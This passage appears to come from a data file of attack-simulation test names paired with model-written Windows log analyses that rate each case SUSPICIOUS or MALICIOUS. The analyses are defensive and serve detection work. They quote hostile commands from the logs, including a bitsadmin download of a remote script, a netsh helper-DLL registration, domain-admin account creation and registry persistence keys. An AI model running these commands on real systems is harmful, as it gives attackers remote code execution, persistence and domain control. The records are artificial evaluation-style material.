   bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\\bitsadmin1_flag.ps1
   ```
   This behavior is suspicious as BITSAdmin is often used by attackers to download files from remote servers when exploiting Windows systems, instead of using the more common means of downloading files (such as web browsers). The URL points to a GitHub content, which may or may not be trustworthy.

2. **Multiple Wevtutil Executions**: Several occurrences of `wevtutil.exe` running under the `SERVER002\\admin_test` user. `Wevtutil` is utilized for managing event logs and can be misused by attackers to clear event logs and cover their tracks.

3. **High Integrity Level**: The processes use a high integrity level, indicating elevated privileges. This could potentially allow the execution of harmful activities on the system.

4. **Sysmon Logs**: The logs show a sequence of events where `conhost.exe` and other system binaries run in quick succession under the same user context, which might imply a scripted operation or automation that is unusual. While some of these occurrences could be legitimate administrative tasks, their pattern requires further verification.

5. **Executable Paths And Users**: Review of regular Microsoft processes such as `MicrosoftEdgeUpdate.exe`, most running under the `NT AUTHORITY\SYSTEM` context, which might indicate legitimate updates occurring for Microsoft Edge. However, these should be cross-referenced with actual update windows or schedules with IT admin records.

**Assessment**:
- **SUSPICIOUS**: The activity in the logs, particularly the use of BITSAdmin for downloading scripts from a potentially malicious source, and wevtutil executions along with high integrity levels, raises suspicion and requires further investigation. Though some Edge update operations appear normal, the context and nature of downloading scripts from an external repository leave room for security risks.

**Guidance**:
1. **Isolate and Investigate**: The system should be isolated from the network to prevent potential data exfiltration or wider network compromise while an investigation continues.

2. **Verify External Links**: Immediately verify the legitimacy of the external URL (GitHub link) used for the download. Cross-reference the download attempt with patch management or software distribution teams, if applicable.

3. **Log Content Review**: Rigorously review further logs to identify any related or subsequent malicious activity, particularly focusing on logs from antivirus or endpoint protection software to check for any alerts regarding malicious files.

4. **Analyze User Activity**: Look into user account activities, especially `SERVER002\\admin_test`, to ensure this was not a compromised account used for lateral movement or privilege escalation.

5. **File Integrity and Hash Check**: Perform hash checks of the files involving suspicious activity to ensure they match known good versions.

**Conclusion**: The presence of suspicious actions, primarily the file download using BITSAdmin and potential clearing of logs or cover-up activities, indicates that the situation contains elements that do not align with normal and expected system behavior and should be addressed with further scrutiny."
Office Application Startup - Outlook as a C2,"**Detailed Analysis of Logs:**

1. **Time Change Events:**
   - Security log events 30565 and 30566, as well as System log events 3695 and 3698, indicate a system time change. Such changes, especially if unauthorized or unexplained, can be suspicious as they might signal attempts to mask malicious activity by altering timestamps. However, time changes can also be benign if related to legitimate synchronization processes.

2. **Process Execution:**
   - The Sysmon logs indicate multiple executions of system binaries such as `hostname.exe`, `whoami.exe`, `cmd.exe`, and `conhost.exe`. While these binaries are legitimate, their execution can be associated with enumeration and malicious activity, especially when used in combination.
   - The `cmd.exe` instance (Event 18373) executing a command with the `reg.exe` process to modify registry settings is suspicious. Modifying Outlook security settings could be indicative of an attempt to weaken email security or enable macro execution for further attack stages.

3. **Command-Line Arguments:**
   - The command executed by `cmd.exe` includes a registry modification that changes an Outlook security setting. This behavior is typically unusual for standard operations and could point towards possible tampering or preparation for a phishing attack or similar threat.

4. **High Integrity Level:**
   - Processes such as `whoami.exe` and `cmd.exe` are executed with a high integrity level, indicating that they are running with elevated permissions. This can be normal, but could also be leveraged in privilege escalation tactics.

5. **Frequent Execution of Utility Processes:**
   - Multiple instances of `wevtutil.exe` and related `conhost.exe` processes appear frequently. While not inherently malicious, they can be leveraged to manipulate or clear logs to cover tracks. Further investigation would be needed to ascertain if this activity is legitimate.

6. **Parent Process Association:**
   - The parent processes for multiple Sysmon events point to `wsmprovhost.exe`, which is associated with Windows Remote Management. While legitimate, if not properly configured or monitored, it can be exploited for lateral movement within a network.

**Assessment:**
- The detection of registry modifications aimed at adjusting Outlook security settings is concerning. Combined with the execution of process enumeration binaries (e.g., `whoami.exe`), these events stand out as more than typical administrative tasks and warrant caution.

- The log analysis indicates a need for further investigation into the noted behavior. The registry modification via `cmd.exe` appears to potentially lower email security, which is a typical preparation step for more advanced stages of a targeted attack.

**Resolution:**
- **SUSPICIOUS:** The activity noted, specifically the registry modification targeting Outlook, along with the use of network and user enumeration binaries, displays characteristics that are unusual and potentially indicative of deeper malicious intent. Further investigation is required, particularly into the source and intent behind the registry changes, validation of user activities, and exploration of any potential external communications by the involved processes.

**Guidance on How to Proceed:**
1. **Investigate the Context:**
   - Obtain more information about the user `admin_test` and their activities around the timestamp of these events.
   - Verify whether the time change was performed by a legitimate operation such as NTP synchronization or was a manual adjustment.

2. **Examine Network Activity:**
   - Inspect network logs and connections for any unusual outbound or inbound traffic, focusing on the timestamp of execution noted in the logs.

3. **Check Authorized Changes:**
   - Confirm whether there was a legitimate reason for registry and time changes, perhaps through approved administrative tasks.

4. **Review System and Configuration Settings:**
   - Analyze the configuration of remote management tools like `wsmprovhost.exe` for unauthorized adjustments or misconfigurations that could facilitate exploitation.

5. **Conduct Endpoint Analysis:**
   - Investigate the endpoints for potential indicators of compromise or malware and ensure that antivirus/malware detection tools are up to date and actively scanning.
   
6. **Audit Logs:**
   - Increase logging and monitoring for any further suspicious activities, particularly regarding executable launches and command executions."
Create Symbolic Link From osk.exe to cmd.exe,"After examining the provided Windows event logs, let's identify any suspicious activities that stand out and conclude whether the logs indicate any malicious activity.

### System Log Analysis:
- **Time Setting Changes**: Multiple events (EventID 1 from `Microsoft-Windows-Kernel-General`) indicate changes in system time. Time changes can be legitimate but may also suggest tampering attempts. These changes were carried out by `svchost.exe`, which is commonly used for legitimate system tasks but can be used maliciously if compromised.

### Sysmon Log Analysis:
- **Unusual Command Execution**: Execution of `CMD.EXE` (EventID 1 with Process ID 6812) with a command that involves operating system functionality modifications, such as taking ownership of `osk.exe`, an accessibility tool. This command attempts to replace `osk.exe` with `cmd.exe` using symbolic links. This is a known technique for privilege escalation and suggests potential malicious intent.
- **Multiple Instances of `wevtutil.exe`**: Repeated execution of `wevtutil.exe` might involve event log manipulation, potentially attempting to clear tracks.
- **Common Tools**: Tools like `HOSTNAME.EXE`, `whoami.exe`, and `conhost.exe` were run under `SERVER002\\admin_test`, indicative of manual interaction or script activity, often present in reconnaissance or scripting for lateral movements.

### Security Log Analysis:
- **Privilege Escalation**: `admin_test` user was granted several powerful privileges (EventID 4672), including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can be leveraged for malicious actions.
- **Successful Logons**: NTLM authentication was used (EventID 4624), showing a successful logon of the `admin_test` user from `DESKTOP-3HL5B2P`. The source is an external desktop, suggesting potential remote access, which could be unauthorized.

### Application Log Analysis:
- **Software Protection Event**: Regular event from Software Protection Platform, indicating that licensing checks and protection processes are in place. No direct issues.

### Final Assessment:
The combination of privilege escalation, suspicious command execution, and potential time tampering warrants closer scrutiny of user `admin_test` and any activities surrounding external remote access.

**Resolution**: SUSPICIOUS

### Guidance:
1. **Immediate Actions**:
   - Investigate user `admin_test` activities and access patterns.
   - Verify the integrity and security configurations of `osk.exe` and related system files.
   - Review network logs for any unusual connections from `DESKTOP-3HL5B2P`.
   
2. **Long-term Actions**:
   - Increase monitoring on privileged accounts and sensitive configurations.
   - Review and strengthen policy on remote access and network segmentation.
   - Conduct a thorough threat assessment to identify and mitigate potential attack vectors.

Additional investigation is necessary to confirm or dispel any potential threats and mitigate any risks outlined by these events."
Netsh Helper DLL Registration,"Here's my analysis of the provided logs:

### Analysis Summary
1. **Windows Sysmon Log**:
   - There are multiple instances of processes being executed with the `SYSTEM` user account, which generally indicates legitimate system processes.
   - A series of events involving `WindowsPowerShell.exe`, `wevtutil.exe`, and `cmd.exe` stand out due to their potential misuse for malicious purposes like command execution, event log clearing, or configuration changes.
   - Command executed by `cmd.exe` appears particularly suspicious:  
     `""cmd.exe"" /c netsh.exe add helper ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\NetshHelper.dll"" & taskkill /im notepad.exe /t /f > NUL 2>&1`
     - **netsh** is adding a helper DLL from an unusual directory, which can be indicative of a compromised executable or persistence mechanism.
     - **taskkill** is used to forcefully terminate Notepad, possibly as a means to hide activity or ensure stability of malicious operations.

2. **Application Log**:
   - Edge Update events are expected on Windows systems and generally benign, although frequent starts and stops could potentially indicate tampering or issues with updating.

### Assessment
- **Suspicious Activity:**
  - The use of `netsh.exe` to add a DLL and `taskkill` together is highly suspicious, suggesting potential malicious activity aimed at setting up a backdoor or similar persistence mechanism.
  - `wevtutil.exe` instances are logged, a tool often used by attackers to clear event logs.

### Resolution: SUSPICIOUS
Given the context of the observed `netsh.exe` behavior and its potential for misuse in combination with other indicators such as PowerShell and event log manipulation (even without their content), the log entries raise some red flags that warrant a further detailed investigation to rule out or confirm malicious intent.

### Recommended Actions
1. **Immediate Investigation**:
   - Perform a deeper inspection on the system for the presence of unauthorized DLLs and persistence mechanisms, especially in the mentioned directories.
   - Check the system for known malware signatures linked to the observed behavior.
   - Enhance monitoring on this host for additional anomalous behavior or signs of compromise.
   
2. **Forensic Analysis**:
   - Review other event logs, especially Security and System logs, for any further suspicious activities around the same timeframe.
   - Conduct integrity checks on `wevtutil.exe`, `netsh.exe`, `cmd.exe`, and `powershell.exe` to ensure they have not been tampered with.

3. **Preventive Measures**:
   - Implement stricter execution policies, especially around PowerShell usage.
   - Limit the ability to add network helpers or perform similar actions to trusted administrators.
   - Educate users about the risks of executing or permitting such arbitrary command modifications without verification. 

Further investigation is essential to determine the true nature of these activities."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"### Analysis of Provided Logs

#### System Log
1. **Time Change Events:**
   - The TimeCreated timestamps and TimeZone/Time Adjustments (EventID 1 and EventID 24) in the Kernel-General logs indicate multiple adjustments to the system time. This is usually typical of synchronization with a time server (as seen with events referencing `time.windows.com`).

#### Sysmon Log
2. **Process Execution:**
   - Multiple instances of **whoami.exe**, **conhost.exe**, **HOSTNAME.EXE**, **reg.exe**, **cmd.exe**, etc., are logged. These are legitimate Windows executables, but their use in rapid succession, especially with `reg.exe` within `cmd.exe` and entries involving registry operations in context with ""malware_test,"" raises a red flag.
     
   - The registry modifications added under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test` with subsequent command execution (`atbroker /start malware_test`) is especially concerning. This pattern is often associated with persistence mechanisms used by malicious actors to inject or re-launch malicious executables.

3. **Use of Potentially Malicious Commands:**
   - The repeated execution of `cmd.exe` with a command line that invokes the registry to add specific entries associated with ""malware_test"" suggests a potentially malicious activity aimed at maintaining persistence or executing unauthorized actions.

#### Security Log
4. **Security Logs on Time Adjustments:**
   - The entries showing time correction operations performed by `svchost.exe`, operating under the LOCAL SERVICE account, coincide with the System logs. While not inherently suspicious in isolation, they warrant evaluation if unauthorized changes were a concern.

### Assessment

- **Indicators of Compromise:** Evidence suggests modifications to the registry for potential persistence mechanisms using names indicative of malware (""malware_test""). Presence of PowerShell and command executables with these operations flags potential abuse.
  
- **Threat & Risk Assessment:** The sequence of registry modifications, the use of legitimate executables in suspected unconventional operations, and attempts to initiate processes with registry keys designed for ""malware_test"" signify a potential threat.

### Resolution

**MALICIOUS** - The activities exhibit characteristics consistent with malicious behavior, specifically around persistence or latent backdoor installation. Immediate action includes:
- Review and isolation of the affected host.
- Detailed forensic investigation to confirm all affected areas.
- Checking for additional unauthorized registry changes or configurations.
- Network traffic analysis to identify potential data exfiltration or C2 communications.

It is strongly advised to engage in incident response procedures promptly, as these activities should not be considered benign."
COM hijacking via TreatAs,"Upon reviewing the provided log entries, several indicators suggest suspicious activity that could be indicative of a potential compromise on the system:

1. **PowerShell Activity:**
   - The PowerShell logs show a series of registry modifications using the `reg.exe` command through a PowerShell script. These modifications are particularly suspicious, given that they create CLSIDs with entries pointing to ""scrobj.dll"" in the system directory, which is used for various legitimate purposes but can also be exploited for malicious activities (e.g., DLL hijacking).
   - The creation of a ""ScriptletURL"" pointing to a GitHub URL for a potential scriptlet file (`TreatAs.sct`) is notable. This can be a technique used for executing arbitrary code from remote sources.

2. **Execution of Rundll32:**
   - The use of `rundll32.exe` with the argument ""-sta fileTest"" is suspicious. Rundll32 is a legitimate Windows component for executing DLLs, but it is often used by malicious actors to execute payloads indirectly.

3. **Sysmon Logs:**
   - This log shows the execution of PowerShell with a detailed command line argument that matches those modifying the registry. This reinforces the suspicion raised from the PowerShell logs.
   - Multiple Sysmon entries correspond to the running of `reg.exe` to create or modify numerous registry entries, which are associated with the PowerShell command observed. This coordination indicates automated or script-driven actions.

4. **The Use of COM Surrogates:**
   - The execution of `dllhost.exe` as a COM Surrogate during this activity is also noteworthy. While `dllhost.exe` can be used for legitimate purposes, its execution in this context could be related to obfuscating which processes are performing malicious actions.

5. **Security and System Logs:**
   - Events indicating security-related actions are normal, but the close timing with potentially suspicious registry changes indicates systematic, potentially unauthorized changes.

**Assessment:**
The combination of registry modifications, PowerShell, and the use of rundll32 and dllhost suggest a potentially malicious campaign that merits further investigation. Although there are legitimate uses for these tools, the context and manner of their operation in this instance are suspicious.

**Resolution: SUSPICIOUS**
- The activities in the logs are suspicious, suggesting the need for additional investigation. Further analysis should focus on:
  - Verifying whether the registry entries and scriptlet from the GitHub URL are known or potentially malicious.
  - Analyzing network traffic during this period for any unauthorized data exfiltration or unexpected outbound connections.
  - Considering isolating the host for further forensic analysis to ensure no compromise continues.
- It's advisable to audit other systems for similar activities, as this could be part of a broader coordinated effort. 

Further investigation is essential to determine the true nature and intent of these actions."
Adding custom debugger for Windows Error Reporting,"### Analysis of Logs:

#### System Log:
1. **Kernel-General events** related to time changes (Event ID 1 and 24) with consistent adjustments. These adjustments align with time synchronization events and do not indicate suspicious behavior. Time changes are often logged due to time synchronization with an NTP server, which is a regular activity.
2. **Time Service event (Event ID 35)** indicating synchronization with `time.windows.com`, which is a typical time update source for Windows systems.

#### Sysmon Log:
1. **Process Execution Events**:
   - Execution of standard Windows utilities such as `hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`, and `cmd.exe`. These are typical system processes but should be analyzed in the context of their command-line arguments.
   
2. **Command-Line Usage**:
   - The use of `cmd.exe` launching a command to add a debugger to Windows Error Reporting (`reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f`). This appears suspicious as altering registry keys related to debugging can be a tactic used in persistence mechanisms or to interfere with normal error reporting.

3. **Integrity Level**: All processes run with a high integrity level, indicating administrative privileges, which is noteworthy for potentially unauthorized script execution.

#### Security Log:
1. **Security-Auditing (Event ID 4616)** logs time adjustment on the system without anomalies, similar to System log entries.

#### Application Log:
1. The **Software Protection Platform Service** logs an event indicating a time-related activity without suspicious modifications.

### Assessment:
The logs primarily show benign activity involving common Windows processes, with the exception of the registry change made via `cmd.exe`. The delegation of error handling to `notepad.exe` instead of a debugger may indicate a misconfiguration or a rudimentary attempt at persistence or execution blocking.

### Finding:
- **Suspicion** is primarily centered on the use of `cmd.exe` to modify registry settings related to Windows Error Reporting. This activity is not typical for daily administrative tasks and could be used to hide errors or to persist executables on the system.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
1. **Further Investigation**:
   - Review the access logs for the user `SERVER002\admin_test` at the time of the suspicious registry change.
   - Investigate any scripts or automated tasks that may have been responsible for executing the command.
   - Check the integrity and legitimacy of affected Windows binaries (`cmd.exe`, `reg.exe`) to ensure they are unaltered.
   - Verify if this alteration aligns with any authorized changes or IT policies.

2. **Audit and Monitoring**:
   - Increase the logging and monitoring of the registry and processes executed by high-integrity level users.
   - Employ behavior-based anomaly detection mechanisms to alert on unusual registry modifications or potential persistence actions.

3. **User Awareness**:
   - Inform relevant personnel about the potential misconfiguration or unauthorized script execution, and enforce strict privileged access controls and audits.

By following up on these recommendations, you can ensure better detection and identification of potential malicious activities on the host environment."
Powershell Execute COM Object,"Upon examining the provided logs, several events suggest potentially suspicious or anomalous behavior, warranting further investigation. Let's analyze these in detail:

1. **Security Logs (Event ID 4672 and 4624):**
   - User `admin_test` with SID `S-1-5-21-3962163828-2803415714-1403596700-1006` was granted special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. These are high-privilege rights typically unnecessary for regular operations and could suggest a privilege escalation attempt.
   - Multiple logon events with `LogonType` 3 (network logon), for user `admin_test`, imply remote access, and although not suspicious alone, it raises questions combined with other events.

2. **Sysmon Logs (Process Creation and Execution):**
   - A PowerShell process (`powershell.exe`) is executing a command that uses the COM object `ShellExecute` to launch `cmd.exe` with a command to start `calc.exe`. While `calc.exe` itself is benign, this method of execution is often seen in attempts to execute commands stealthily.
   - Repeated observations of execution of `whoami.exe`, `wevtutil.exe`, `conhost.exe`, and `hostname.exe` processes with user `admin_test`. These may help an attacker enumerate, manipulate logs, or interact with the terminal – common post-exploitation behavior.

3. **Windows PowerShell Logs:**
   - The command to instantiate a COM object (`activator::CreateInstance`) and execute `cmd.exe` within PowerShell is suspicious. This kind of script might be used in a living-off-the-land style attack to execute commands invisibly.

4. **Time Discrepancies (Event ID 4616):**
   - The system time was adjusted backward. Though legitimate applications might adjust system time, time tampering can be employed to confuse logs or evade detection in time-sensitive security systems.

### Assessment:
The combination of the high privileges granted to `admin_test`, remote access logs, invocation of PowerShell scripts that execute commands in a suspicious manner, and tampering with system time indicates potentially unauthorized or malicious activity. These activities reflect known indicators of compromise (IOCs) associated with lateral movement and privilege escalation techniques.

### Resolution:
- **SUSPICIOUS**: The activity observed is highly suspicious due to multiple signs of potential compromise. The behavior noted does not conclusively confirm malicious intent without question, but the collected evidence strongly suggests potential security issues.

### Recommendations:
- Conduct a thorough investigation on `Server002` focusing on the activities of the `admin_test` account.
- Review any recent changes or anomalies related to users with high privileges.
- Employ endpoint detection and response (EDR) tools to monitor PowerShell and process executions on `Server002`.
- Examine network activity associated with `192.168.0.102` and the IPv6 address logged, ensuring it is legitimate traffic.
- Consider resetting the account credentials and examine how these privileges were granted or potentially misused."
Registry key creation and-or modification events for SDB,"Upon reviewing the provided Windows event logs, several activities and patterns stand out, and it's crucial to analyze them to determine if there's any indication of malicious activity.

### Analysis:

1. **Edge Update Service Activity:**
   - Multiple entries relate to ""Microsoft Edge Update"" and its various processes (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`).
   - These processes appear as expected update operations, with several processes under NT AUTHORITY\SYSTEM, which is typical for update tasks.
   - No suspicious command-line arguments or unexpected directory usage are present in these records.

2. **PowerShell Activity:**
   - A PowerShell script attempts to create registry key entries under `HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom` and `InstalledSDB`.
   - The command involves the use of `New-ItemProperty`, which could be used for legitimate purposes, but can also be a method for persistence or other modifications to the system in a malicious context.
   - This activity can warrant attention as PowerShell can be a common tool for both administrators and attackers, specifically due to the lack of specific details on the ""filedata.011"" entries.

3. **Security Log:**
   - Events related to user `admin_test` include user logon (ID 4624) and assigned privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc. This user gaining privileges is not inherently suspicious unless this elevation is unexpected or unauthorized.
   - The use of these privileges could enable actions like debugging or taking ownership of files, which need careful scrutiny especially if the user role doesn't typically require these rights.

4. **Time Change Events:**
   - Multiple events imply a system time change (EventID 4616 and similar in Security log), usually performed by services like svchost.exe. Time changes might be normal, such as syncing time with a time service, but they can also be used to confuse timestamps in logs for forensic purposes if not correctly justified.

5. **Process Executions and Parent/Child Relationships:**
   - Normal system processes like `whoami.exe`, `svchost.exe`, and `conhost.exe` are executed, generally without malicious patterns.
   - Entries of special interest, such as the numerous executions related to conhost.exe, show legitimate parent processes (`WindowsPowerShell` and `whoami.exe`) in their lineage.

### Assessment:

- **Suspicious Elements:**
  - The PowerShell operations modifying registry values could be benign, but in the absence of context or legitimate administrative tasks, they could indicate a persistence mechanism.
  - Privilege assignments that include powerful privileges to `admin_test` can be dangerous if not justified by role.
  - Time modifications should be verified if aligned with normal operations (e.g., daylight savings adjustments).

### Resolution:

Given the potential risk factors identified through PowerShell script execution and privilege changes, it is important to conduct further investigation.

- **Resolution: SUSPICIOUS**

### Guidance:

1. **Further Investigation Needed:**
   - Verify the legitimacy and necessity of the PowerShell scripts and the registry changes. If there's no documented administrative need, inspect for unauthorized scripts.
   - Assess user `admin_test` for authorized privilege changes or potential misuse.
   - Confirm the legitimacy of system time changes—check against time service settings.

2. **Monitoring and Alerting:**
   - Implement monitoring for unusual PowerShell activities and excessive or non-standard privilege usage.
   - Set alerts on registry key modifications, particularly under known persistence pathways like `AppCompatFlags`.

3. **Conduct a Threat Hunt:**
   - Run a deeper threat hunt on the host focusing on persistence mechanisms, privilege escalations, and lateral movement potential.

This determination assists in identifying potential security incidents, warranting a more detailed investigation to confirm legitimacy or uncover a security incident."
Create a new Windows domain admin user,"Based on the provided logs, the primary area of concern involves the potential creation and elevation of a user account within the ""Domain Admins"" group. Here’s a detailed analysis of each log section provided:

### System Log
- The **System Log** entries primarily involve time synchronization and administrative service operations (`svchost.exe`), which appear to be routine operations typically performed by the Windows Time service. There’s no indication of malicious activity here.

### Application Log
- The **Application Log** includes events related to the `edgeupdate` service being stopped, which is a regular occurrence when an update completes its process. Similarly, there are entries for the System Protection Platform service with no immediate red flags suggesting compromise.

### Sysmon Log
- The **Sysmon Log** captures multiple instances of the `wevtutil.exe` and `conhost.exe` processes being executed by the `SERVER002\admin_test` user.
- More critically, there are Sysmon events showing the execution of `cmd.exe` with a command to:
  ```
  net user ""data.002_Admin"" ""data_pass123!"" /add /domain & net group ""Domain Admins"" ""data.002_Admin"" /add /domain
  ```
  This indicates that a new user account `data.002_Admin` was added and then granted ""Domain Admins"" privileges, suggesting unauthorized privilege escalation.

### Security Log
- The **Security Log** shows Privileged Account Logon, indicating the user `admin_test` has logged in with elevated privileges (`SeDebugPrivilege`, etc.). There's also evidence suggesting the use of NTLM authentication which typically can indicate lateral movement or remote logins.

### Assessment
- The Sysmon logs demonstrate critical evidence of privilege escalation. Specifically, the behavior indicates a potential compromise as an unexpected user account is created and elevated to a domain administrative role using command-line instructions—behavior characteristic of malicious intent.

### Resolution
- **MALICIOUS** - The logs contain definitive malicious activity, evidenced by unauthorized user creation and their addition to the ""Domain Admins"" group. 

### Guidance on How to Proceed:
1. **Immediate Action**: 
   - Remove the unauthorized user account `data.002_Admin` from the ""Domain Admins"" group and disable the account.
   - Audit other accounts with Administrative privileges for unauthorized changes or creations.
   
2. **Conduct a Full Investigation**:
   - Analyze other systems for similar accounts created or elevated privileges.
   - Check if other systems in the network show signs of compromise, such as unknown user accounts or privilege escalations.
   
3. **Incident Response**:
   - Engage the incident response team to conduct a thorough forensic investigation.
   - Review all user activities associated with `admin_test` and other administrative users for abnormal patterns.
   
4. **Strengthen Security Postures**:
   - Ensure all systems are patched and updated.
   - Implement endpoint detection and response tools to catch such incidents in real-time.
   - Strengthen password policies and consider multifactor authentication for domain admins."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"### Analysis of the Provided Windows Event Logs

Upon analyzing the provided logs, several observations and potential indicators require attention:

#### Noteworthy Observations:

1. **Edge Update Activities:**
   - There are numerous events related to `MicrosoftEdgeUpdate`, including service starts, updates, and registry operations. While such events can be routine, the frequency and variety of edge update events could merit further investigation to confirm their legitimacy.
   - The application log records the stopping of the service associated with edge updates around ""2024-10-27 13:06:04"", aligning with multiple Sysmon entries indicating significant activity involving Edge updater processes.

2. **PowerShell Execution:**
   - There is a PowerShell script execution logged, specifically using `New-ItemProperty` to manipulate registry keys for `AutoRun`. The command attempts to set `notepad.exe` to run upon command processor invocation:
     - `powershell.exe & {New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}`
   - This behavior is worth scrutinizing; registry modifications affecting `AutoRun` keys can typically indicate attempts to achieve persistence on the system and could potentially be an indicator of compromise if not executed by an authorized process with benign intention.

3. **Process Execution with Elevated Privileges:**
   - Several processes, including `whoami.exe`, `hostname.exe`, and several other Windows utilities, are executed by `SERVER002\admin_test`, using high integrity levels.
   - The legitimate nature of these processes, alongside their execution by an administrator account, raises fewer immediate concerns but could be correlated with other activities for anomaly detection.

4. **System Time Manipulation:**
   - Numerous `Kernel-General` and related security events indicate adjustments to system time (NewTime and OldTime discrepancies). Such changes are often part of routine corrections but, if unexpected, may indicate malicious time manipulation to obscure logs or coordinate malicious activities.

### Assessment and Recommendations

- **Assessment: SUSPICIOUS**
  - The activity related to `PowerShell` indicates potential registry manipulation for persistence tactics, which is concerning if not authorized.
  - The frequent updates and installs of the `MicrosoftEdgeUpdate` indicates a high level of orchestrated activity that, while potentially normal due to version upgrades, should be reviewed to confirm they originate from trusted processes and do not include malicious payloads.
  - Time changes, while possibly routine, should be validated against the NTP settings or internal IT policies to ensure they are not opportunistic time-stamping anomalies linked to nefarious actions.

### Next Steps

1. **Verify PowerShell Activity:**
   - Determine if the PowerShell command setting `AutoRun` to `notepad.exe` reflects a legitimate script utilized during a planned maintenance operation or security configuration.
   - Evaluate potential indicators for malicious intentions, aligning this activity with known threat patterns.

2. **Analyze and Validate Edge Update Activities:**
   - Review scheduled updates and releases from Microsoft Edge's release notes to ensure the activities align with intended update windows.
   - Utilize security software to validate blocks of these update payloads against signatures of known malware.

3. **Review of Time Adjustments:**
   - Collaborate with IT operations to trace back time synchronization settings on affected systems and verify if manual adjustments have been logged officially.

4. **Increase Monitoring and Logging:**
   - Implement enhanced logging and alerting on PowerShell and registry events to capture any further unauthorized attempts or successful changes.

This assessment focuses on identifying potentially unauthorized behaviors for further investigation before classifying any activity as benign or malicious."
Change Default File Association,"Upon reviewing the provided Sysmon and Application logs, I have conducted a detailed analysis focusing on process execution, command-line arguments, privilege escalation, and potential indicators of malicious activity.

### Analysis:

1. **Frequent Execution of System Utilities:**
   - There are multiple instances of the execution of `wevtutil.exe`, `whoami.exe`, and `hostname.exe`. The repeated execution of these utilities in quick succession might indicate reconnaissance activities. However, without further context, such as a script execution or a known legitimate purpose, the mere execution of these utilities is not inherently malicious.
   - The presence of `cmd.exe` with the command line `\""cmd.exe\"" /c assoc .hta=txtfile` is noteworthy. Modifying file associations is a potential red flag for malicious activity as it may be leveraged for an attack, such as associating HTA files with a harmless extension.

2. **Microsoft Edge Update Activity:**
   - The logs show multiple entries related to the update processes of Microsoft Edge, including `MicrosoftEdgeUpdateComRegisterShell64.exe` and `msedgeupdate.dll`. While these activities appear legitimate, given the context of Microsoft Edge Update operations, they generate multiple processes in a short time span.
   - The presence of temporary installation files and setup executions (`setup.exe`) with verbose command line options is typical of update processes; however, they should be verified against expected operations if there's suspicion.

3. **Process Creation by SYSTEM Account:**
   - Most update and installation processes are run by `NT AUTHORITY\\SYSTEM`, which is expected for legitimate software updates. However, any anomalies in these processes should be cross-verified with scheduled updates or tasks known to run at the given times.

### Conclusion:

- **Potentially Anomalous Behavior:** The frequent execution of certain utilities (`whoami.exe`, `hostname.exe`, etc.) and the modification of file associations by a script or command (`assoc .hta=txtfile`) necessitate further scrutiny to affirm there isn't an ongoing compromise or misconfigured automation.

- **Updates and Installations:** The activities related to Microsoft Edge Update processes appear consistent with legitimate system updates; however, reviewing the legitimacy of the update versions and scheduling could further eliminate potential risks.

### Resolution:
Given these observations, the activity is marked as **SUSPICIOUS** due to specific behavioral anomalies that merit further investigation. The sysmon logs themselves include utility executions and potential modification commands that could either be benign (such as part of a script) or an early indicator of a misconfiguration or compromise. It's advisable to:

- **Verify recent changes:** Confirm any recent scheduled tasks or scripts that might intentionally perform these activities.
- **Ensure updated signatures:** Ensure that the Microsoft Edge Update configurations align with expected updates and versions post-October 2024.
- **Cross-reference with user actions:** Investigate recent user activity on `SERVER002` to see if logs correspond to any known administrative actions or legitimate maintenance tasks. 

If no legitimate reason for these actions is determined, further forensic analysis might be necessary to determine if there is an active breach or misconfiguration on the host."
Install Outlook Home Page Persistence,"Upon reviewing the provided Windows event logs, I've conducted a detailed analysis of the behaviors and activities logged across the System, Security, Sysmon, and other logs. Here's the assessment of each component and a summary conclusion:

### System and Security Logs
1. **Time Change Events**: 
   - The Windows Kernel-General events (EventID 24 and 1) show a series of time change activities conducted by the `svchost.exe` process. This is a standard process for such activities, often corresponding to legitimate time synchronization with NTP servers (EventID 35 confirms a time source as time.windows.com).
   - Security audit (EventID 4616) logs these changes, identifying the changes are executed under the `LOCAL SERVICE` account, typically benign and related to system operations.

2. **No indication of privilege escalation or other typical malicious activities** within these logs.

### Sysmon Log
1. **Frequent Process Executions**:
   - Multiple entries for executions of `wevtutil.exe` and `conhost.exe`, running under `SERVER002\\admin_test`. These are legitimate Windows utilities, usually harmless when executed with expected arguments.
   - **Noteworthy Execution**: 
     - `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` executed within a short time frame could be part of expected administrative operations, but their frequency and sequential nature should be inspected further. No critical red flags, but should be validated, particularly for the `cmd.exe` execution involving registry modifications (`sysmon EventID 1 - reg.exe command`).
   - **Reg.exe Execution**:
     - The `reg.exe` command is executed to add paths to the Windows Registry. This action modifies Outlook's WebView settings, potentially redirecting content. This could be valid in a development environment but is suspicious as it can reflect unauthorized configuration changes.
   
2. **High Integrity Process Level**:
   - The majority are executed with High Integrity Level, which is expected under privileged user accounts but should be monitored to prevent misuse.

### Conclusion and Recommendation
Based on the review, the logs primarily indicate normal system and administrative activities. However, the registry modification via `cmd.exe` and `reg.exe`, particularly targeting Microsoft Office components, is worth a closer inspection due to potential misuse for persistence or data exfiltration tactics.

**Resolution**: **SUSPICIOUS**

### Guidance on How to Proceed
1. **Investigate Registry Changes**: Review the context for executing `reg.exe` to understand its necessity and align with documented IT operations and policies.
2. **Account Review**: Confirm the activities conducted by `SERVER002\\admin_test` relate to authorized operations. Validate user activity logs, recent changes in permissions, or credentials that could indicate compromise.
3. **Network Activity**: Monitor network connections following these events to rule out connections to malicious endpoints.
